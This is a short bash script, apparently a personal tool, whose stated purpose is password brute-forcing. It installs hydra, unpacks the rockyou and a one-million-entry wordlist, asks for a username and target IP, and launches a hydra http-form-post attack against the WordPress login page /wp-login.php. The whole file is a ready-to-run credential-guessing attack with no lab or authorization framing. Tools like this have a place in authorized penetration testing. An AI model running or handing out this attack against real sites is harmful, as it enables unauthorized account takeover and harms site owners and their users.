#!/bin/bash
#
# Author: Joseph Hurley
# Purpose: Password brute-forcing

# ANSI escape Codes (for colored output, -e required on echo)
RED='\033[0;31m'
GREEN='\u001b[32m'
NC='\033[0m' # No Color

# install required packages
echo -e "downloading reqired packages..."
sudo apt install hydra

# download and unpack wordlists
echo -e "$GREEN""moving wordlists""$NC"
cp -n /mnt/c/Users/Sephley/Documents/GitHub/Hydra/Hydra/wordlists/rockyou.txt.gz ~
cp -n /mnt/c/Users/Sephley/Documents/GitHub/Hydra/Hydra/wordlists/1milpwlist.txt ~

# create directories
mkdir ~/pwbruteforcer
mkdir ~/pwbruteforcer/wordlists
mv ~/rockyou.txt.gz ~/pwbruteforcer/wordlists
mv ~/1milpwlist.txt ~/pwbruteforcer/wordlists

# de-compress rockyou.txt
echo -e "$GREEN""de-compressing wordlists""$NC"
gzip -d ~/pwbruteforcer/wordlists/rockyou.txt.gz

echo -e "$GREEN""enter username: ""$NC"
read -r USERNAME

echo -e "$GREEN""type your destined IP-Address: ""$NC"
read -r IPADDRESS

# variables for wordlists
ROCKYOU='rockyou.txt'
ONEMILPWLIST='1milpwlist.txt'

echo -e "$GREEN""select the wordlist you would like to use\n""$NC"
select d in rockyou.txt 1milpwlist.txt; 
do test -n "$d" && break; 
echo -e "$RED>>> Invalid Selection""$NC"; done

if [ "$REPLY" == 1 ] ;
then echo -e "$GREEN""you picked the following wordlist: rockyou.txt""$NC"
hydra -l "$USERNAME" -P ~/pwbruteforcer/wordlists/$ROCKYOU "$IPADDRESS" -V http-form-post '/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log In&testcookie=1:S=Location'
else echo -e "$GREEN""you picked the following wordlist: 1milpwlist.txt""$NC"
hydra -l "$USERNAME" -P ~/pwbruteforcer/wordlists/$ONEMILPWLIST "$IPADDRESS" -V http-form-post '/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log In&testcookie=1:S=Location'
fi

# use pw-inspector to filter?
